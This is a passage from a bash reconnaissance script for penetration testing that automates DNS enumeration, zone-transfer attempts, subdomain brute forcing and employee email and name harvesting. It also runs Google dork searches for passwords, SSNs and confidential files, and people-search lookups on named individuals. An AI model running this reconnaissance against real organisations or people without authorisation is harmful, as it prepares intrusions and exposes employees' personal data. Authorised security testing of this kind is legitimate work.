news|index|infant|inform|innovation|installation|insurers|integrated|intellectual|international|internet|instructor|insurance|intelligence|interested|interns|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|language|laptops|large|leader|letter|level|liaison|licensing|lighting|linguist|linkedin|limitless|liveedu|llp|local|looking|lpn|ltd|lsu|luscous|machinist|macys|malware|managed|management|manager|managing|manufacturing|market|mastering|material|mathematician|maturity|md|mechanic|media|medical|medicine|member|merchandiser|meta tags|methane|metro|microsoft|middle east|migration|mission|mitigation|mn|money|monitor|more coming|mortgage|motor|museums|mutual|national|negative|network|network|new user|newspaper|new york|next page|night|nitrogen|nw|nyc|obtain|occupied|offers|office|online|onsite|operations|operator|order|organizational|outbreak|owner|packaging|page|palantir|paralegal|partner|pathology|peace|people|perceptions|person|pharmacist|philippines|photo|picker|picture|placement|places|planning|police|portfolio|postdoctoral|potassium|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|property|publichealth|published|pyramid|quality|questions|rcg|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|representative|republic|research|resolving|responsable|restaurant|retired|revised|rising|rural health|russia|sales|sample|satellite|save the date|school|scheduling|science|scientist|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solution|source|special|sql|station home|statistics|store|strategy|strength|student|study|substitute|successful|sunoikisis|superheroines|supervisor|support|surveillance|switch|system|systems|talent|targeted|tax|tcp|teach|technical|technician|technique|technology|temporary|tester|textoverflow|theater|thought|through|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|transformation|treasury|trojan|truck|twitter|training|ts|tylenol|types of scams|unclaimed|underground|underwriter|university|united states|untitled|vault|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|vp|wanted|web search|web site|website|welcome|west virginia|westchester|when the|whiskey|window|worker|world|www|xbox|zz)' tmp7 > tmp8
     sed 's/iii/III/g' tmp8 | sed 's/ii/II/g' > tmp9
     # Capitalize the first letter of every word
     sed 's/\b\(.\)/\u\1/g' tmp9 | sed 's/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcs/McS/g; s/,,/,/g' > tmp10
     grep -v ',' tmp10 | awk '{print $2", "$1}' > tmp11
     grep ',' tmp10 > tmp12
     # Remove trailing whitespace from each line
     cat tmp11 tmp12 | sed 's/[ \t]*$//' | sort -u > names2

     ##############################################################

     echo "recon-ng                  (34/$total)"
     echo
     echo "workspaces add $domain" > tmp.rc
     echo "add companies" >> tmp.rc
     echo "$companyurl" >> tmp.rc
     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' tmp.rc
     echo "none" >> tmp.rc
     echo "add domains" >> tmp.rc
     echo "$domain" >> tmp.rc
     echo >> tmp.rc

     if [ -s /root/data/names.txt ]; then
          echo "last_name#first_name#title" > /root/data/names.csv
          cat /root/data/names.txt | sed 's/, /#/' | sed 's/  /#/' | tr -s ' ' | tr -d '\t' | sed 's/# /#/g' >> /root/data/names.csv
          cat $discover/resource/recon-ng-import-names.rc >> tmp.rc
          echo >> tmp.rc
     fi

     if [ -s names2 ]; then
          echo "last_name#first_name" > /root/data/names2.csv
          cat names2 | sed 's/, /#/' >> /root/data/names2.csv
          cat $discover/resource/recon-ng-import-names2.rc >> tmp.rc
          echo >> tmp.rc
     fi

     cat $discover/resource/recon-ng.rc >> tmp.rc
     sed -i "s/yyy/$domain/g" tmp.rc
     recon-ng --no-check -r $discover/tmp.rc

     ##############################################################

     grep "@$domain" /tmp/emails | awk '{print $2}' | egrep -v '(>|SELECT)' | sort -u > emails-recon
     cat emails emails-recon | sort -u > emails-final

     grep '|' /tmp/names | egrep -iv '(_|aepohio|aepsoc|contact|production)' | sed 's/|//g; s/^[ \t]*//; /^[0-9]/d; /^-/d' | tr '[A-Z]' '[a-z]' | sed 's/\b\(.\)/\u\1/g; s/iii/III/g; s/ii/II/g; s/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcs/McS/g; s/[ \t]*$//' | sort -u > names-recon

     grep '/' /tmp/networks | grep -v 'Spooling' | awk '{print $2}' | $sip > networks-recon

     grep "$domain" /tmp/subdomains | grep -v '>' | awk '{print $2,$4}' | column -t | sort -u > sub-recon
     ##############################################################

     cat networks-tmp networks-recon | sort -u | $sip > networks

     cat sub* | grep -v "$domain\." | grep -v '|' | sed 's/www\.//g' | column -t | tr '[A-Z]' '[a-z]' | sort -u > tmp
     # Remove lines that contain a single word
     sed '/[[:blank:]]/!d' tmp > subdomains

     awk '{print $2}' subdomains > tmp
     grep -E '([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})' tmp | egrep -v '(-|=|:)' | $sip > hosts

     if [ -e networks ]; then
          cat networks > tmp 2>/dev/null
          echo >> tmp
     fi

     cat hosts >> tmp 2>/dev/null
     cat tmp >> $home/data/$domain/data/hosts.htm; echo "</pre>" >> $home/data/$domain/data/hosts.htm 2>/dev/null

     ##############################################################

     echo > zreport
     echo >> zreport

     echo "Summary" >> zreport
     echo $short >> zreport

     echo > tmp

     if [ -e emails-final ]; then
          emailcount=$(wc -l emails-final | cut -d ' ' -f1)
          echo "Emails        $emailcount" >> zreport
          echo "Emails ($emailcount)" >> tmp
          echo $short >> tmp
          cat emails-final >> tmp
          echo >> tmp
          cat emails-final >> $home/data/$domain/data/emails.htm; echo "</pre>" >> $home/data/$domain/data/emails.htm
     fi

     if [ -e names-recon ]; then
          namecount=$(wc -l names-recon | cut -d ' ' -f1)
          echo "Names         $namecount" >> zreport
          echo "Names ($namecount)" >> tmp
          echo $short >> tmp
          cat names-recon >> tmp
          echo >> tmp
          cat names-recon >> $home/data/$domain/data/names.htm; echo "</pre>" >> $home/data/$domain/data/names.htm
     fi

     if [ -s networks ]; then
          networkcount=$(wc -l networks | cut -d ' ' -f1)
          echo "Networks      $networkcount" >> zreport
          echo "Networks ($networkcount)" >> tmp
          echo $short >> tmp
          cat networks >> tmp
          echo >> tmp
     fi

     if [ -e hosts ]; then
          hostcount=$(wc -l hosts | cut -d ' ' -f1)
          echo "Hosts         $hostcount" >> zreport
          echo "Hosts ($hostcount)" >> tmp
          echo $short >> tmp
          cat hosts >> tmp
          echo >> tmp
     fi

     if [ -e squatting ]; then
          urlcount2=$(wc -l squatting | cut -d ' ' -f1)
          echo "Squatting     $urlcount2" >> zreport
          echo "Squatting ($urlcount2)" >> tmp
          echo $long >> tmp
          cat squatting >> tmp
          echo >> tmp
          cat squatting >> $home/data/$domain/data/squatting.htm; echo "</pre>" >> $home/data/$domain/data/squatting.htm
     fi

     if [ -e domains ]; then
          domaincount1=$(wc -l domains | cut -d ' ' -f1)
          domaincount2=$(echo $(($domaincount1-1)))
          echo "Domains       $domaincount2" >> zreport
          echo "Domains ($domaincount2)" >> tmp
          echo $long >> tmp
          cat domains >> tmp
          echo >> tmp
          cat domains >> $home/data/$domain/data/domains.htm; echo "</pre>" >> $home/data/$domain/data/domains.htm
     fi

     if [ -e subdomains ]; then
          urlcount=$(wc -l subdomains | cut -d ' ' -f1)
          echo "Subdomains    $urlcount" >> zreport
          echo "Subdomains ($urlcount)" >> tmp
          echo $long >> tmp
          cat subdomains >> tmp
          echo >> tmp
          cat subdomains >> $home/data/$domain/data/subdomains.htm; echo "</pre>" >> $home/data/$domain/data/subdomains.htm
     fi

     if [ -e xls ]; then
          xlscount=$(wc -l xls | cut -d ' ' -f1)
          echo "Excel         $xlscount" >> zreport
          echo "Excel Files ($xlscount)" >> tmp
          echo $long >> tmp
          cat xls >> tmp
          echo >> tmp
          cat xls >> $home/data/$domain/data/xls.htm; echo "</pre>" >> $home/data/$domain/data/xls.htm
     fi

     if [ -e pdf ]; then
          pdfcount=$(wc -l pdf | cut -d ' ' -f1)
          echo "PDF           $pdfcount" >> zreport
          echo "PDF Files ($pdfcount)" >> tmp
          echo $long >> tmp
          cat pdf >> tmp
          echo >> tmp
          cat pdf >> $home/data/$domain/data/pdf.htm; echo "</pre>" >> $home/data/$domain/data/pdf.htm
     fi

     if [ -e ppt ]; then
          pptcount=$(wc -l ppt | cut -d ' ' -f1)
          echo "PowerPoint    $pptcount" >> zreport
          echo "PowerPoint Files ($pptcount)" >> tmp
          echo $long >> tmp
          cat ppt >> tmp
          echo >> tmp
          cat ppt >> $home/data/$domain/data/ppt.htm; echo "</pre>" >> $home/data/$domain/data/ppt.htm
     fi

     if [ -e txt ]; then
          txtcount=$(wc -l txt | cut -d ' ' -f1)
          echo "Text          $txtcount" >> zreport
          echo "Text Files ($txtcount)" >> tmp
          echo $long >> tmp
          cat txt >> tmp
          echo >> tmp
          cat txt >> $home/data/$domain/data/txt.htm; echo "</pre>" >> $home/data/$domain/data/txt.htm
     fi

     if [ -e doc ]; then
          doccount=$(wc -l doc | cut -d ' ' -f1)
          echo "Word          $doccount" >> zreport
          echo "Word Files ($doccount)" >> tmp
          echo $long >> tmp
          cat doc >> tmp
          echo >> tmp
          cat doc >> $home/data/$domain/data/doc.htm; echo "</pre>" >> $home/data/$domain/data/doc.htm
     fi

     cat tmp >> zreport

     if [ -e whois-domain ]; then
          echo "Whois Domain" >> zreport
          echo $long >> zreport
          cat whois-domain >> zreport
          cat whois-domain >> $home/data/$domain/data/whois-domain.htm; echo "</pre>" >> $home/data/$domain/data/whois-domain.htm
     fi

     if [ -e whois-ip ]; then
          echo >> zreport
          echo "Whois IP" >> zreport
          echo $long >> zreport
          cat whois-ip >> zreport
          cat whois-ip >> $home/data/$domain/data/whois-ip.htm; echo "</pre>" >> $home/data/$domain/data/whois-ip.htm
     fi

     cat zreport >> $home/data/$domain/data/passive-recon.htm; echo "</pre>" >> $home/data/$domain/data/passive-recon.htm

     mv recon-ng.rc $home/data/$domain/ 2>/dev/null
     rm curl debug* emails* hosts names* networks* squatting sub* tmp* network-tools whois* z* doc pdf ppt txt xls domains 2>/dev/null
     rm $home/data/*.csv 2>/dev/null
     cd /tmp/
     rm emails names networks profiles subdomains 2>/dev/null

     # Robtex
     wget -q https://gfx.robtex.com/gfx/graph.png?dns=$domain -O $home/data/$domain/images/robtex.png

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain/
     echo
     read -p "Press <return> to continue."

     ##############################################################

     f_runlocally

     $web &
     sleep 4
     $web https://connect.data.com/login &
     sleep 2
     $web http://toolbar.netcraft.com/site_report?url=http://www.$domain &
     sleep 2
     $web https://www.google.com/search?site=\&tbm=isch\&source=hp\&q=$companyurl%2Blogo &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Axls+OR+filetype%3Axlsx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Appt+OR+filetype%3Apptx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Adoc+OR+filetype%3Adocx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Aasp &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Apdf &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Atxt &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:admin &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:confidential &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:connect &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:login &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:portal &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:upload &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+%22internal+use+only%22 &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+password &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+ssn &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+%22top+secret%22 &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+%22index+of/%22+%22parent+directory%22 &
     sleep 2
     $web https://www.google.com/#q=site%3Apastebin.com+intext:%40$domain &
     sleep 2
     $web http://boardreader.com/s/$domain.html;language=English &
     sleep 2
     $web https://www.censys.io/ipv4?q=$domain &
     sleep 2
     $web http://api.hackertarget.com/pagelinks/?q=$domain &
     sleep 2
     $web https://dockets.justia.com/search?parties=%22$companyurl%22&cases=mostrecent &
     sleep 2
     $web pastebin.com/search?cx=013305635491195529773%3A0ufpuq-fpt0\&cof=FORID%3A10\&ie=UTF-8\&q=$companyurl\&sa.x=0\&sa.y=0 &
     sleep 2
     $web http://www.reuters.com/finance/stocks/lookup?searchType=any\&search=$companyurl &
     sleep 2
     $web https://www.sec.gov/cgi-bin/browse-edgar?company=$companyurl\&owner=exclude\&action=getcompany &
     sleep 2
     $web https://www.ssllabs.com/ssltest/analyze.html?d=$domain\&hideResults=on\&latest &
     sleep 2
     $web $home/data/$domain/index.htm &
     echo
     echo
     exit
     ;;

     2)
     clear
     f_banner

     echo -e "\x1B[1;34mUses Nmap, dnsrecon, Fierce, lbd, WAF00W, traceroute, and Whatweb.\x1B[0m"
     echo
     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub, Google, Hashes, and\x1B[0m"
     echo -e "\x1B[1;34mShodan for maximum results with recon-ng.\x1B[0m"
     echo
     echo $medium
     echo
     echo "Usage: target.com"
     echo
     echo -n "Domain: "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     # If folder doesn't exist, create it
     if [ ! -d $home/data/$domain ]; then
          cp -R $discover/report/ $home/data/$domain
          sed 's/REPLACEDOMAIN/'$domain'/g' $home/data/$domain/index.htm > tmp
          mv tmp $home/data/$domain/index.htm
     fi

     # Number of tests
     total=11

     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )

     echo
     echo $medium
     echo

     echo "Nmap"
     echo "     Email                (1/$total)"
     nmap -Pn -n --open -p80 --script=http-grep $domain > tmp
     grep '@' tmp | awk '{print $3}' > emails1

     echo
     echo "dnsrecon"
     echo "     DNS Records          (2/$total)"
     dnsrecon -d $domain -t std > tmp
     egrep -v '(All queries|Bind Version for|Could not|Enumerating SRV|It is resolving|not configured|Performing|Records Found|Recursion|Resolving|TXT|Wildcard)' tmp > tmp2
     # Remove first 6 characters from each line
     sed 's/^......//g' tmp2 | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10}' | column -t | sort -u -k2 -k1 > tmp3
     grep 'TXT' tmp | sed 's/^......//g' | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15}' >> tmp3
     egrep -v '(SEC3|SKEYs|SSEC)' tmp3 > records
     cat $home/data/$domain/data/records.htm records | grep -v '<' | column -t | sort -u -k2 -k1 > tmp3

     echo '<pre style="font-size:14px;">' > $home/data/$domain/data/records.htm
     cat tmp3 | column -t >> $home/data/$domain/data/records.htm; echo "</pre>" >> $home/data/$domain/data/records.htm

     echo "     Zone Transfer        (3/$total)"
     dnsrecon -d $domain -t axfr > tmp
     egrep -v '(Checking for|Failed|filtered|NS Servers|Removing|TCP Open|Testing NS)' tmp | sed 's/^....//g' | sed /^$/d > zonetransfer

     echo "     Sub-domains (~5 min) (4/$total)"
     if [ -f /usr/share/dnsrecon/namelist.txt ]; then
          dnsrecon -d $domain -t brt -D /usr/share/dnsrecon/namelist.txt --iw -f > tmp
     fi

     # PTF
     if [ -f /pentest/intelligence-gathering/dnsrecon/namelist.txt ]; then
          dnsrecon -d $domain -t brt -D /pentest/intelligence-gathering/dnsrecon/namelist.txt --iw -f > tmp
     fi

     grep $domain tmp | grep -v "$domain\." | egrep -v '(Performing|Records Found)' | sed 's/\[\*\] //g; s/^[ \t]*//' | awk '{print $2,$3}' | column -t | sort -u > subdomains-dnsrecon

     echo
     echo "Fierce (~5 min)           (5/$total)"
     if [ -f /usr/share/fierce/hosts.txt ]; then
          fierce -dns $domain -wordlist /usr/share/fierce/hosts.txt -suppress -file tmp4
     fi

     # PTF
     if [ -f /pentest/intelligence-gathering/fierce/hosts.txt ]; then
          fierce -dns $domain -wordlist /pentest/intelligence-gathering/fierce/hosts.txt -suppress -file tmp4
     fi

     sed -n '/Now performing/,/Subnets found/p' tmp4 | grep $domain | awk '{print $2 " " $1}' | column -t | sort -u > subdomains-fierce

     cat subdomains-dnsrecon subdomains-fierce | egrep -v '(.nat.|1.1.1.1|6.9.6.9|127.0.0.1)' | column -t | tr '[A-Z]' '[a-z]' | sort -u | awk '$2 !~ /[a-z]/' > subdomains

     if [ -e $home/data/$domain/data/subdomains.htm ]; then
          cat $home/data/$domain/data/subdomains.htm subdomains | grep -v "<" | grep -v "$domain\." | column -t | sort -u > subdomains-combined
          echo '<pre style="font-size:14px;">' > $home/data/$domain/data/subdomains.htm
          cat subdomains-combined >> $home/data/$domain/data/subdomains.htm
          echo "</pre>" >> $home/data/$domain/data/subdomains.htm
     fi

     awk '{print $3}' records > tmp
     awk '{print $2}' subdomains-dnsrecon subdomains-fierce >> tmp
     grep -E '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}' tmp | egrep -v '(-|=|:|1.1.1.1|6.9.6.9|127.0.0.1)' | $sip > hosts

     echo
     echo "Loadbalancing             (6/$total)"
     lbd $domain > tmp 2>/dev/null
     # Remove first 5 lines & clean up
     sed '1,5d' tmp | sed 's/DNS-Loadbalancing: NOT FOUND/DNS-Loadbalancing:\nNOT FOUND\n/g' | sed 's/\[Date\]: /\[Date\]:\n/g' | sed 's/\[Diff\]: /\[Diff\]:\n/g' > tmp2
     # Replace the 10th comma with a new line & remove leading whitespace from each line
     sed 's/\([^,]*,\)\{9\}[^,]*,/&\n/g' tmp2 | sed 's/^[ \t]*//' | sed 's/, NOT/\nNOT/g' | grep -v 'NOT use' > loadbalancing

     echo
     echo "Web Application Firewall  (7/$total)"
     wafw00f -a http://www.$domain > tmp
     cat tmp | egrep -v '(By Sandro|Checking http://www.|Generic Detection|requests|WAFW00F)' > tmp2
     sed "s/ http:\/\/www.$domain//g" tmp2 | egrep -v "(\_|\^|\||<|')" | sed '1,4d' > waf

     echo
     echo "Traceroute"
     echo "     UDP                  (8/$total)"
     echo "UDP" > tmp
     traceroute $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     echo >> tmp
     echo "ICMP ECHO" >> tmp
     echo "     ICMP ECHO            (9/$total)"
     traceroute -I $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     echo >> tmp
     echo "TCP SYN" >> tmp
     echo "     TCP SYN              (10/$total)"
     traceroute -T $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     grep -v 'traceroute' tmp > tmp2
     # Remove blank lines from end of file
     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp2 > ztraceroute

     echo
     echo "Whatweb                   (11/$total)"
     grep -v '<' $home/data/$domain/data/subdomains.htm | awk '{print $1}' > tmp
     whatweb -i tmp --color=never --no-errors > tmp2 2>/dev/null
     # Find lines that start with http, and insert a line after
     sort tmp2 | sed '/^http/a\ ' > tmp3
     # Cleanup
     sed 's/,/\n/g' tmp3 | sed 's/^[ \t]*//' | sed 's/\(\[[0-9][0-9][0-9]\]\)/\n\1/g; s/http:\/\///g' | grep -v 'Country' > whatweb

     grep '@' whatweb | sed 's/Email//g; s/\[//g; s/\]//g' > tmp
     # Change to lower case
     cat tmp | tr '[A-Z]' '[a-z]' > emails2
     cat emails1 emails2 | grep "@$domain" | grep -v 'hosting' | cut -d ' ' -f2 | sort -u > emails

     # If this file is empty, delete it
     if [ ! -s emails ]; then rm emails; fi
     if [ ! -s hosts ]; then rm hosts; fi
     if [ ! -s records ]; then rm records; fi
     if [ ! -s subdomains ]; then rm subdomains; fi

     echo
     echo "recon-ng                  (12/$total)"
     cp $discover/resource/recon-ng-active.rc $discover/
     sed -i "s/xxx/$companyurl/g" $discover/recon-ng-active.rc
     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' $discover/recon-ng-active.rc
     sed -i "s/yyy/$domain/g" $discover/recon-ng-active.rc
     recon-ng --no-check -r $discover/recon-ng-active.rc

     grep "$domain" /tmp/subdomains | grep -v '>' | awk '{print $2,$4}' | column -t > sub-recon

     ##############################################################

     echo > zreport
     echo >> zreport

     echo "Summary" >> zreport
     echo $short >> zreport

     echo > tmp

     if [ -e emails ]; then
          emailcount=$(wc -l emails | cut -d ' ' -f1)
          echo "Emails        $emailcount" >> zreport
          echo "Emails ($emailcount)" >> tmp
          echo $short >> tmp
          cat emails >> tmp
          echo >> tmp
     fi

     if [ -e hosts ]; then
          hostcount=$(wc -l hosts | cut -d ' ' -f1)
          echo "Hosts         $hostcount" >> zreport
          echo "Hosts ($hostcount)" >> tmp
          echo $short >> tmp
          cat hosts >> tmp
          echo >> tmp
     fi

     if [ -e records ]; then
          recordcount=$(wc -l records | cut -d ' ' -f1)
          echo "DNS Records   $recordcount" >> zreport
          echo "DNS Records ($recordcount)" >> tmp
          echo $long >> tmp
          cat records >> tmp
          echo >> tmp
     fi

     if [ -e subdomains ]; then
          subdomaincount=$(wc -l subdomains | cut -d ' ' -f1)
          echo "Subdomains    $subdomaincount" >> zreport
          echo "Subdomains ($subdomaincount)" >> tmp
          echo $long >> tmp
          cat subdomains >> tmp
          echo >> tmp
     fi

     cat tmp >> zreport

     echo "Loadbalancing" >> zreport
     echo $long >> zreport
     cat loadbalancing >> zreport

     echo "Web Application Firewall" >> zreport
     echo $long >> zreport
     cat waf >> zreport

     echo >> zreport
     echo "Traceroute" >> zreport
     echo $long >> zreport
     cat ztraceroute >> zreport

     echo >> zreport
     echo "Zone Transfer" >> zreport
     echo $long >> zreport
     cat zonetransfer >> zreport

     echo >> zreport
     echo "Whatweb" >> zreport
     echo $long >> zreport
     cat whatweb >> zreport

     cat loadbalancing >> $home/data/$domain/data/loadbalancing.htm; echo "</pre>" >> $home/data/$domain/data/loadbalancing.htm
     cat zreport >> $home/data/$domain/data/active-recon.htm; echo "</pre>" >> $home/data/$domain/data/active-recon.htm
     cat ztraceroute >> $home/data/$domain/data/traceroute.htm; echo "</pre>" >> $home/data/$domain/data/traceroute.htm
     cat waf >> $home/data/$domain/data/waf.htm; echo "</pre>" >> $home/data/$domain/data/waf.htm
     cat whatweb >> $home/data/$domain/data/whatweb.htm; echo "</pre>" >> $home/data/$domain/data/whatweb.htm
     cat zonetransfer >> $home/data/$domain/data/zonetransfer.htm; echo "</pre>" >> $home/data/$domain/data/zonetransfer.htm

     if [[ -e $home/data/$domain/data/emails.htm && -e emails ]]; then
          cat $home/data/$domain/data/emails.htm emails | grep -v '<' | sort -u > tmp
          echo '<pre style="font-size:14px;">' > $home/data/$domain/data/emails.htm
          cat tmp >> $home/data/$domain/data/emails.htm; echo "</pre>" >> $home/data/$domain/data/emails.htm
     fi

     cat hosts $home/data/$domain/data/hosts.htm | grep -v '<' | $sip > tmp
     echo '<pre style="font-size:14px;">' > $home/data/$domain/data/hosts.htm
     cat tmp >> $home/data/$domain/data/hosts.htm; echo "</pre>" >> $home/data/$domain/data/hosts.htm

     rm emails* hosts loadbalancing recon-ng-active.rc records sub* tmp* waf whatweb z* /tmp/subdomains 2>/dev/null

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain/
     echo
     echo

     $web $home/data/$domain/index.htm &
     exit
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_person(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mRECON\x1B[0m"
echo
echo -n "First name: "
read firstName

# Check for no answer
if [[ -z $firstName ]]; then
     f_error
fi

echo -n "Last name:  "
read lastName

# Check for no answer
if [[ -z $lastName ]]; then
     f_error
fi

$web &
sleep 2
$web http://www.411.com/name/$firstName-$lastName/ &
sleep 2
uripath="http://www.advancedbackgroundchecks.com/search/results.aspx?type=&fn=${firstName}&mi=&ln=${lastName}&age=&city=&state="
$web $uripath &
sleep 2
$web https://www.linkedin.com/pub/dir/?first=$firstName\&last=$lastName\&search=Search &
sleep 2
$web http://www.peekyou.com/$firstName%5f$lastName &
sleep 2
$web http://phonenumbers.addresses.com/people/$firstName+$lastName &
sleep 2
$web https://pipl.com/search/?q=$firstName+$lastName\&l=\&sloc=\&in=5 &
sleep 2
$web http://www.spokeo.com/$firstName-$lastName &
sleep 2
$web https://twitter.com/search?q=%22$firstName%20$lastName%22&src=typd &
sleep 2
$web https://www.youtube.com/results?search_query=$firstName+$lastName &
sleep 2
$web http://www.zabasearch.com/query1_zaba.php?sname=$firstName%20$lastName&state=ALL&ref=$ref&se=$se&doby=&city=&name_style=1&tm=&tmr= &

f_main
}

##############################################################################################################

f_salesforce(){
clear
f_banner

echo -e "\x1B[1;34mCreate a free account at salesforce (https://connect.data.com/login).\x1B[0m"
echo -e "\x1B[1;34mPerform a search on your target company > select the company name > see all.\x1B[0m"
echo -e "\x1B[1;34mCopy the results into a new file.\x1B[0m"

f_location

echo
echo

sed 's/Direct Dial Available//g' $location | sed 's/\[\]//g; s/\.//g; s/,,//g; s/,`//g; s/`,//g; s/ - /, /g; s/-cpg//g; s/, Millstone//g; s/3d/3D/g; 
s/\-a/, A/g; s/Aberdeen Pr//g; s/ACADEMIC/Academic/g; s/account/Account/g; s/ACTING/Acting/g; s/3administrator/Administrator/g; s/Europe and Africa//g; 
s/Sub Saharan Africa//g; s/South Africa//g; s/Agoura Hills//g; s/New Albany//g; s/Albion 	QL//g; s/Aliso Viejo//g; s/Allentown//g; s/Allison Park//g; 
s/Altamonte S//g; s/Am-east,//g; s/Am-west,//g; s/Head of Americas//g; s/The Americas//g; s/Amst-north America//g; s/ANALYSIST/Analysist/g; 
s/Analyst\//Analyst, /g; s/analytics/Analytics/g; s/and New England//g; s/and Central Us//g; s/and Student at American University//g; 
s/North Andover//g; s/Andrews Afb//g; s/Andrews Air//g; s/android/Android/g; s/Annapolis J//g; s/Ann Arbor//g; s/, Anzsea//g; s/Apple Valley//g; 
s/applications/Applications/g; s/Arlington H//g; s/Asia-Pacific//g; s/Asia and India//g; s/asia Pacific Region//g; s/Asia Pacific//g; 
s/assistant/Assistant/g; s/AssistantChiefPatrolAgent/Assistant Chief Patrol Agent/g; s/associate/Associate/g; s/at Bah//g; s/Atlanta//g; 
s/at Booz Allen Hamilton//g; s/at Booz Allen//g; s/at Google//g; s/at Spawar//g; s/Atlantic City//g; s/Atm/ATM/g; s/attorney/Attorney/g; 
s/, Australia, New Zealand, and South East Asia//g; s/Australia S//g; s/automated/Automated/g; s/\-b/, B/g; s/Ballston Spa//g; s/Bangalore S//g; 
s/banking/Banking/g; s/Basking Ridge//g; s/Baton Rouge//g; s/Battle Creek//g; s/Battle Ground//g; s/Bay City//g; s/Bay Shore//g; s/BC//g; s/Bd/BD/g; 
s/Beaver Falls//g; s/Bel Air//g; s/Bella Vista//g; s/Berkeley He//g; s/Berwyn Hts//g; s/Bethel Park//g; s/Buena Vista//g; s/Beverly Hills//g; 
s/billing/Billing/g; s/Black Belt//g; s/Boca Raton//g; s/-booz and Company Inc//g; s/-Booz and Company Inc//g; s/-Booz and Company Ltd//g; 
s/-Booz and Company//g; s/-booz and Co//g; s/-Booz and Co//g; s/booz Allen Hamilton//g; s/BORDER/Border/g; s/Bowling Green//g; s/Boynton Beach//g; 
s/Br //g; s/branch/Branch/g; s/\/Branch/, Branch/g; s/branch/Branch/g; s/Buffalo Grove//g; s/business/Business/g; s/buyer/Buyer/g; s/By The//g; 
s/\-c/, C/g; s/Calabasas Hls//g; s/Camp Hill//g; s/Camp H M Smith//g; s/Camp Springs//g; s/Canoga Park//g; s/Canyon Country//g; s/Cape Canaveral//g; 
s/Cape Coral//g;  s/Cape May//g; s/Capitol Hei//g; s/cargo/Cargo/g; s/Carol Stream//g; s/Carol Stream//g; s/cascade/Cascade/g; s/Castle Rock//g; 
s/Cedar Hill//g; s/Cedar Rapids//g; s/census/Census/g; s/Center Line//g; s/CENTER/Center/g; s/Central California//g; s/Central Region//g; 
s/central Region//g; s/Chagrin Falls//g; s/Charles Town//g; s/Charlottesv//g; s/CHEMICALS/Chemicals/g; s/Cherry Hill//g; s/Chester Le //g; 
s/East Chicago//g; s/\/Chief/, Chief/g; s/China //g; s/Chino Hills//g; s/chromecast/Chromecast/g; s/Chula Vista//g; s/Cissp/CISSP/g; s/CITRIX/Citrix/g; 
s/CIVIL/Civil/g; s/clean/Clean/g; s/Clifton Park//g; s/Clifton Spr//g; s/cms/CMS/g; s/Cms/CMS/g; s/CNN News Group Cable News Network//g; s/Cmms/CMMS/g; 
s/Cocoa Beach//g; s/Cold Spring//g; s/Colorado Sp//g; s/Commerce City//g; s/CommitteemanagementOfficer/Committee Management Officer/g; 
s/compliance/Compliance/g; s/commercial/Commercial/g; s/connected/Connected/g; s/CONSULTANT/Consultant/g; s/Consultant-ii/Consultant II/g; 
s/consumer/Consumer/g; s/contact/Contact/g; s/content/Content/g; s/corporate/Corporate/g; s/Corpus Christi//g; s/Council Bluffs//g; s/COUNSEL/Counsel/g; 
